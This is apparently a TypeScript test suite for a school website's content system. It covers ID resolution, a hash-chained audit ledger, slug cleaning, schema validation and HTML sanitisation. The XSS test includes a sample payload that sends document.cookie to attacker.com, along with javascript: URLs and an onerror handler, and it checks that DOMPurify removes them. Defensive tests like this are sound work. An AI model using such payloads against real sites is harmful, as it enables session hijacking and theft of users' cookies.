import { describe, it, expect } from "vitest";
import { z } from "zod";
import crypto from "crypto";
import DOMPurify from "isomorphic-dompurify";
import mongoose from "mongoose";

// --- 1. Polymorphic ID Resolution Helper ---
function resolvePolymorphicQuery(input: any) {
  const rawId = input?.id?._id || input?.id || input;
  const stringId = String(rawId || "").trim();
  const isObjectId = mongoose.Types.ObjectId.isValid(stringId);

  return {
    rawId,
    stringId,
    isObjectId,
    query: isObjectId
      ? { $or: [{ _id: new mongoose.Types.ObjectId(stringId) }, { id: stringId }, { title: stringId }] }
      : { $or: [{ id: stringId }, { title: stringId }, { slug: stringId }] },
  };
}

// --- 2. Blockchain-Style Audit Ledger Simulator ---
interface LedgerBlock {
  sequenceNumber: number;
  action: string;
  module: string;
  performedBy: string;
  documentId?: string;
  details?: string;
  previousHash: string;
  currentHash: string;
  timestamp: string;
}

function createLedgerBlock(
  lastBlock: LedgerBlock | null,
  data: { action: string; module: string; performedBy?: string; documentId?: string; details?: string }
): LedgerBlock {
  const sequenceNumber = (lastBlock?.sequenceNumber || 0) + 1;
  const previousHash = lastBlock?.currentHash || "GENESIS_BLOCK_00000000000000000000000000000000000000000000000000000000";
  const timestamp = new Date().toISOString();
  const performedBy = data.performedBy || "Admin";

  const hashPayload = `${sequenceNumber}:${data.action}:${data.module}:${performedBy}:${data.documentId || ""}:${data.details || ""}:${previousHash}:${timestamp}`;
  const currentHash = crypto.createHash("sha256").update(hashPayload).digest("hex");

  return {
    sequenceNumber,
    action: data.action,
    module: data.module,
    performedBy,
    documentId: data.documentId,
    details: data.details,
    previousHash,
    currentHash,
    timestamp,
  };
}

function verifyLedgerIntegrity(blocks: LedgerBlock[]): boolean {
  for (let i = 0; i < blocks.length; i++) {
    const block = blocks[i];
    const prevHash = i === 0
      ? "GENESIS_BLOCK_00000000000000000000000000000000000000000000000000000000"
      : blocks[i - 1].currentHash;

    if (block.previousHash !== prevHash) return false;

    const hashPayload = `${block.sequenceNumber}:${block.action}:${block.module}:${block.performedBy}:${block.documentId || ""}:${block.details || ""}:${block.previousHash}:${block.timestamp}`;
    const calculatedHash = crypto.createHash("sha256").update(hashPayload).digest("hex");

    if (calculatedHash !== block.currentHash) return false;
  }
  return true;
}

// --- 3. URL & Slug Normalizer ---
function normalizeSlug(raw: string): string {
  return raw
    .toLowerCase()
    .trim()
    .replace(/^\/+/, "")
    .replace(/[^a-z0-9\s-]/g, "")
    .replace(/[\s-]+/g, "-")
    .replace(/^-+|-+$/g, "");
}

describe("Comprehensive Full-System Audit & Resilience Tests", () => {
  describe("1. Polymorphic Mongoose ID Coercion & Safety", () => {
    it("recognizes valid 24-character hexadecimal ObjectId strings", () => {
      const validHex = "507f1f77bcf86cd799439011";
      const result = resolvePolymorphicQuery(validHex);
      expect(result.isObjectId).toBe(true);
      expect(result.stringId).toBe(validHex);
    });

    it("safely handles nested object ID payloads e.g. { id: { _id: '...' } }", () => {
      const payload = { id: { _id: "507f1f77bcf86cd799439011" } };
      const result = resolvePolymorphicQuery(payload);
      expect(result.isObjectId).toBe(true);
      expect(result.stringId).toBe("507f1f77bcf86cd799439011");
    });

    it("safely resolves non-ObjectId string identifiers (slugs/titles/custom IDs)", () => {
      const slugId = "sports-complex-facility";
      const result = resolvePolymorphicQuery(slugId);
      expect(result.isObjectId).toBe(false);
      expect(result.stringId).toBe(slugId);
    });

    it("handles null, undefined, empty strings without throwing", () => {
      expect(() => resolvePolymorphicQuery(null)).not.toThrow();
      expect(() => resolvePolymorphicQuery(undefined)).not.toThrow();
      expect(() => resolvePolymorphicQuery("")).not.toThrow();
      expect(() => resolvePolymorphicQuery({})).not.toThrow();
    });
  });

  describe("2. Cryptographic Immutable Audit Ledger", () => {
    it("creates sequential cryptographic hash chain starting from genesis block", () => {
      const ledger: LedgerBlock[] = [];

      const block1 = createLedgerBlock(null, {
        action: "CREATE_PAGE",
        module: "Pages",
        performedBy: "Admin",
        documentId: "page-1",
        details: "Created Academic Curriculum Page",
      });
      ledger.push(block1);

      const block2 = createLedgerBlock(block1, {
        action: "UPDATE_PAGE",
        module: "Pages",
        performedBy: "Admin",
        documentId: "page-1",
        details: "Updated syllabus content",
      });
      ledger.push(block2);

      const block3 = createLedgerBlock(block2, {
        action: "DELETE_MARQUEE",
        module: "Marquee",
        performedBy: "SuperAdmin",
        documentId: "marq-99",
        details: "Deleted expired marquee",
      });
      ledger.push(block3);

      expect(ledger).toHaveLength(3);
      expect(ledger[0].sequenceNumber).toBe(1);
      expect(ledger[1].sequenceNumber).toBe(2);
      expect(ledger[2].sequenceNumber).toBe(3);
      expect(ledger[1].previousHash).toBe(ledger[0].currentHash);
      expect(ledger[2].previousHash).toBe(ledger[1].currentHash);
      expect(verifyLedgerIntegrity(ledger)).toBe(true);
    });

    it("detects tampering or retroactive block modification immediately", () => {
      const ledger: LedgerBlock[] = [];
      const block1 = createLedgerBlock(null, { action: "CREATE", module: "Test" });
      ledger.push(block1);
      const block2 = createLedgerBlock(block1, { action: "UPDATE", module: "Test" });
      ledger.push(block2);

      // Malicious attacker attempts to change details in block 1
      ledger[0].details = "Tampered Action by unauthorized attacker";

      expect(verifyLedgerIntegrity(ledger)).toBe(false);
    });
  });

  describe("3. Slug Normalization & Route Sanitization", () => {
    it("strips leading slashes and special characters from URL slugs", () => {
      expect(normalizeSlug("/about-us")).toBe("about-us");
      expect(normalizeSlug("//admissions-2026/")).toBe("admissions-2026");
      expect(normalizeSlug("Academics & Curriculum!")).toBe("academics-curriculum");
      expect(normalizeSlug("   sports-facilities---indoor   ")).toBe("sports-facilities-indoor");
    });
  });

  describe("4. Schema Input Bounds & Sanitization (Zod)", () => {
    const pageSchema = z.object({
      title: z.string().min(2).max(255),
      slug: z.string().min(2).max(255),
      content: z.string().optional(),
      category: z.string().optional(),
    });

    it("validates legitimate page schema payloads", () => {
      const valid = {
        title: "CBSE Affiliation Disclosure",
        slug: "cbse-affiliation-disclosure",
        content: "<p>Official CBSE disclosure documents.</p>",
        category: "Mandatory",
      };
      expect(() => pageSchema.parse(valid)).not.toThrow();
    });

    it("rejects oversized titles (preventing DB buffer bloating)", () => {
      const invalid = {
        title: "A".repeat(300),
        slug: "valid-slug",
        content: "test",
      };
      expect(() => pageSchema.parse(invalid)).toThrow();
    });
  });

  describe("5. XSS Defense & Rich Text Sanitization", () => {
    it("removes iframe injection, script tags, and malicious event handlers", () => {
      const dirtyHtml = `
        <div class="content">
          <h2>School Notice</h2>
          <p>Regular text</p>
          <script>window.location='http://attacker.com/steal?cookie='+document.cookie</script>
          <iframe src="javascript:alert(1)"></iframe>
          <a href="javascript:alert('pwned')">Click here</a>
          <img src="x" onerror="alert(document.domain)" />
        </div>
      `;

      const cleanHtml = DOMPurify.sanitize(dirtyHtml);

      expect(cleanHtml).not.toContain("<script>");
      expect(cleanHtml).not.toContain("window.location");
      expect(cleanHtml).not.toContain("onerror");
      expect(cleanHtml).not.toContain("javascript:");
      expect(cleanHtml).toContain("<h2>School Notice</h2>");
      expect(cleanHtml).toContain("<p>Regular text</p>");
    });
  });
});
